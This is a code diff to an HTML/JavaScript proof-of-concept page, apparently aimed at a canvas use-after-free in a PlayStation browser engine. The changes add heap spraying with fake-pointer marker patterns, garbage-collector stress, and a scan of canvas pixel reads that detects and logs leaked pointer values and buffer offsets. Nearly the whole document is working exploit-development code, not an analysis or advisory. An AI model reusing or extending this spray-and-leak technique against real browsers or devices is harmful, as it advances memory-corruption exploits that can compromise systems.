@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canvas UAF PoC (PS4/PS5?)</title>
+    <title>Canvas UAF Leak PoC (PS4/PS5?)</title>
     <style>
         #trigger {
             margin: 20px 0;
@@ -20,6 +20,10 @@
             margin-top: 10px;
             white-space: pre-wrap;
             font-family: monospace;
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid #ccc;
+            padding: 10px;
         }
         #canvas {
             display: none;
@@ -27,8 +31,8 @@
     </style>
 </head>
 <body>
-    <h1>Canvas UAF PoC</h1>
-    <p>Click to test UAF. Expect crash or OOM.</p>
+    <h1>Canvas UAF Leak PoC</h1>
+    <p>Click to test UAF and leak address. Expect possible crash.</p>
     <button id="trigger">TEST UAF</button>
     <div id="status">Idle...</div>
     <div id="console"></div>
@@ -39,17 +43,19 @@
         const status = document.getElementById('status');
         const consoleDiv = document.getElementById('console');
         let attemptCount = 0;
+        const imageDataSize = 512 * 512 * 4; // 1MB
 
         function log(msg) {
             consoleDiv.append(msg + '\n');
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
         function stressGC() {
             for (let i = 0; i < 500; i++) {
-                new ArrayBuffer(1024 * 1024); // 1MB
+                new ArrayBuffer(1024 * 1024);
             }
             for (let i = 0; i < 100; i++) {
-                new ArrayBuffer(2 * 1024 * 1024); // 2MB
+                new ArrayBuffer(2 * 1024 * 1024);
             }
         }
 
@@ -66,9 +72,25 @@
             ctx.putImageData(imageData, 0, 0);
         }
 
+        function sprayHeap() {
+            const arrays = [];
+            for (let i = 0; i < 5000; i++) { // Reduced from 10000
+                const buf = new ArrayBuffer(imageDataSize);
+                const view = new DataView(buf);
+                for (let j = 0; j < buf.byteLength; j += 16) {
+                    view.setUint32(j, 0x41424344, true); // ABCD pattern
+                    view.setUint32(j + 4, 0x12345678, true); // Fake ptr low
+                    view.setUint32(j + 8, 0x87654321, true); // Fake ptr high
+                    view.setUint32(j + 12, i, true); // Index
+                }
+                arrays.push(buf);
+            }
+            return arrays;
+        }
+
         function checkImageDataUAF(imageData) {
             const original = new Uint8Array(imageData.data.buffer);
-            const originalCopy = new Uint8Array(original); // Save original state
+            const originalCopy = new Uint8Array(original);
             ctx.putImageData(imageData, 0, 0);
             try {
                 const current = new Uint8Array(ctx.getImageData(0, 0, canvas.width, canvas.height).data.buffer);
@@ -105,7 +127,32 @@
                 if (currentRange) {
                     ranges.push(currentRange);
                 }
-                return { detected: differenceCount > 0, differenceCount, ranges };
+
+                // Check for sprayed pattern
+                let leak = null;
+                try {
+                    const currentView = new DataView(current.buffer);
+                    for (let i = 0; i < Math.min(current.buffer.byteLength - 16, 4096); i += 4) {
+                        if (currentView.getUint32(i, true) === 0x41424344) {
+                            const lo = currentView.getUint32(i + 4, true);
+                            const hi = currentView.getUint32(i + 8, true);
+                            const idx = currentView.getUint32(i + 12, true);
+                            if (lo !== 0x12345678 || hi !== 0x87654321) {
+                                leak = {
+                                    offset: i,
+                                    pattern: 'ABCD',
+                                    ptr: `0x${hi.toString(16).padStart(8, '0')}${lo.toString(16).padStart(8, '0')}`,
+                                    index: idx
+                                };
+                                break;
+                            }
+                        }
+                    }
+                } catch (e) {
+                    return { detected: true, differenceCount, ranges, error: `Leak check error: ${e.message}` };
+                }
+
+                return { detected: differenceCount > 0, differenceCount, ranges, leak };
             } catch (e) {
                 return { detected: true, differenceCount: 0, ranges: [], error: e.message };
             }
@@ -121,10 +168,14 @@
                 const refImageData = ctx.createImageData(512, 512);
                 const refView = new Uint8Array(refImageData.data.buffer);
                 for (let i = 0; i < refView.length; i++) {
-                    refView[i] = 0x46; // Fill with known value
+                    refView[i] = 0x46;
                 }
 
-                // Intensive drawing to trigger UAF
+                // Spray heap
+                log('Spraying heap with 5000 buffers...');
+                const sprayed = sprayHeap();
+
+                // Intensive drawing
                 const drawInterval = setInterval(drawOnCanvas, 1);
 
                 // Check for UAF
@@ -146,6 +197,13 @@
                                 for (const range of result.ranges) {
                                     log(`Offsets: ${range.start}-${range.end}, Original: 0x${range.original.toString(16).padStart(2, '0')}, New: 0x${range.newValue.toString(16).padStart(2, '0')}`);
                                 }
+                            }
+                            if (result.leak) {
+                                status.textContent += `\nLeak at offset ${result.leak.offset}!`;
+                                log(`Leak at offset ${result.leak.offset}:`);
+                                log(`Pattern: ${result.leak.pattern}`);
+                                log(`Ptr: ${result.leak.ptr}`);
+                                log(`Buffer index: ${result.leak.index}`);
                             }
                         } else {
                             status.textContent += '\nUAF occurred, no bytes checked';
@@ -170,6 +228,13 @@
                                         log(`Offsets: ${range.start}-${range.end}, Original: 0x${range.original.toString(16).padStart(2, '0')}, New: 0x${range.newValue.toString(16).padStart(2, '0')}`);
                                     }
                                 }
+                                if (secondResult.leak) {
+                                    status.textContent += `\nLeak at offset ${secondResult.leak.offset}!`;
+                                    log(`Leak at offset ${secondResult.leak.offset}:`);
+                                    log(`Pattern: ${secondResult.leak.pattern}`);
+                                    log(`Ptr: ${secondResult.leak.ptr}`);
+                                    log(`Buffer index: ${secondResult.leak.index}`);
+                                }
                             } else {
                                 status.textContent += '\nUAF occurred, no bytes checked';
                                 log('UAF occurred, no bytes checked');
@@ -179,7 +244,7 @@
                             log('No UAF detected');
                         }
                     }
-                }, 100);
+                }, 200); // Increased timeout
             } catch (err) {
                 status.textContent = `Failed: ${err.message}`;
                 log(`Error: ${err.message}`);
